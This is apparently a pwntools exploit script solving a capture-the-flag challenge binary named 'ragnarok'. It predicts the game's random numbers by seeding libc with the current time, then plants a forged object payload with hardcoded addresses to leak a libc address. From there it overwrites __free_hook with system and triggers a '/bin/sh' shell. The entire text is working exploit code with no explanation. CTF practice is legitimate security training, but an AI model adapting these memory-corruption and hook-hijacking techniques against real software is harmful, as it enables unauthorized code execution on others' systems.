from pwn import *
from ctypes import *

def select(idx):
	r.sendline("1")
	print r.recvuntil("figure :")
	r.sendline(str(idx))
	print r.recvuntil("choice :")

def win(name):
	r.sendline("5")
	print r.recvuntil("choice : ")
	r.sendline("3")
	print r.recvuntil("Target :")
	r.sendline("1")
	sleep(1)
	clib.rand()
	print r.recvuntil("choice : ")
	r.sendline("3")
	print r.recvuntil("Target :")
	r.sendline("1")
	sleep(1.5)
	clib.rand()
	rv = r.recv(1024)

	if "win" in rv:
		r.sendline(name)
		print r.recvuntil("choice :")
		clib.rand()
		return 1
	
	return 0

def lose():
	r.sendline("5")
	while True:
		sleep(0.1)
		rv = r.recv(1024)
		print rv

		if "died" in rv:
			r.sendline("1")
			print r.recvuntil("choice :")
			return		

		r.sendline("1")

def earnMoney(times):
	r.sendline("3")
	sarr = ["h", "i", "t", "c", "o", "n"]

	for i in xrange(times):
		idx = clib.rand() % 6
		clib.rand()
		clib.rand()
		print r.recvuntil("Magic : ")
		r.sendline(sarr[idx])

	r.sendline("p")
	print r.recvuntil("choice :")

def equipWeapon(weapon):
	r.sendline("4")
	print r.recvuntil("weapon :")
	r.sendline(weapon)
	print r.recvuntil("choice :")

def changeDescription(description):
	r.sendline("6")
	print r.recvuntil("Description : ")
	r.sendline(description)
	print r.recvuntil("choice :")

while True:
	clib = cdll.LoadLibrary("libc.so.6")

	r = process("./ragnarok")
	clib.srand(clib.time(0))

	print r.recvuntil("choice :")
	print str(clib.rand() % 3 + 1)

	select(3)
	rt = win("mathboy7")

	if(rt == 0):
		r.close()
		continue

	earnMoney(15)

	lose()

	select(1) # Odin

	equipWeapon("Gungnir")

	payload = p64(0x613690) # character ptr
	payload += "A"*8 + p64(0x610e40) + p64(8) + "A"*8 # 0x610e40 stand for name pointer
	payload += p64(0x613650) + p64(0x1000) + p64(0x1000) # set size for copy
	payload += p64(0x40c690) # 0x613690, vtbl, fake character object start
	payload += "\x00"*32
	payload += p64(0x613690+0x28) + p64(0x8) + p64(0x50) # fake desc
	changeDescription(payload)

	r.sendline("2")
	rv = r.recvuntil("\x7f")[-6:]
	libc = u64(rv + "\x00\x00")
	libc_base = libc - 0x71230
	free_hook = libc_base + 0x3c3788
	system = libc_base + 0x456a0

	print r.recvuntil("choice :")

	print "libc: " + hex(libc)
	
	changeDescription(p64(free_hook) + p64(0x1000) + p64(0x1000)) # overwrite desc ptr -> free_hook
	changeDescription(p64(system)) # overwrite free_hook -> system

	r.sendline("6")
	print r.recvuntil("Description : ")
	r.sendline("/bin/sh\x00"*10)

	r.interactive()
